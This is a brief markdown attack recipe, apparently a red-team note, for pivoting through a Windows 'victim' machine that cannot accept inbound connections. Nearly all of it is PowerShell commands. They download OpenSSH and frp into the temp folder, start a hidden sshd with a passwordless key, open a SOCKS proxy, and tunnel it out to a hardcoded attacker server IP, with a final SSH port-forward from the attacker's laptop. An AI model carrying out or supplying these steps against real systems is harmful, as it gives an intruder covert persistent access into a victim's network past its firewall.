# pivoting a computer not bindable

## attacker_server
1) setting frp
    - download https://github.com/fatedier/frp/releases
    - ./frps -c ./frps.ini 

## victim

1) getting socks server

```powershell
cd $env:TEMP
rm -r -fo .\OpenSSH-Win32\
curl "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v8.9.1.0p1-Beta/OpenSSH-Win32.zip" -o openssh.zip
Expand-Archive -LiteralPath openssh.zip -DestinationPath .
cd .\OpenSSH-Win32\
.\ssh-keygen -f id_rsa -N """"
Clear-Content .\sshd_config_default
$curLocation = Get-Location
Add-Content .\sshd_config_default  "AuthorizedKeysFile $curLocation\id_rsa.pub"
.\sshd.exe -f .\sshd_config_default -h id_rsa -p 2222
```

```powershell
$socksPort = 5555
cd $env:TEMP
cd .\OpenSSH-Win32\
.\ssh.exe -D $socksPort -N localhost -p 2222 -i .\id_rsa -o UserKnownHostsFile=a -o StrictHostKeyChecking=no
```


2) setting frp

```powershell
$attackerServerIp = "3.142.49.137" 
$attackerPort2Socks = 9050
$frpServerPort = 7000
$socksPort = 5555
cd $env:TEMP
curl "https://github.com/fatedier/frp/releases/download/v0.42.0/frp_0.42.0_windows_386.zip" -o frp.zip
Expand-Archive -LiteralPath frp.zip -DestinationPath .
cd frp_0.42.0_windows_386
Clear-Content frpc.ini
Add-Content frpc.ini "[common]"
Add-Content frpc.ini "server_addr = $attackerServerIp"
Add-Content frpc.ini "server_port = $frpServerPort"
Add-Content frpc.ini "[ssh_socks]"
Add-Content frpc.ini "type = tcp"
Add-Content frpc.ini "local_ip = 127.0.0.1"
Add-Content frpc.ini "local_port = $socksPort"
Add-Content frpc.ini "remote_port = $attackerPort2Socks"
.\frpc -c .\frpc.ini
```

## (opcional) attacker_laptop

1) ssh -L localSocksPort:127.0.0.1:attackerPort2Socks user@attackerServerIp
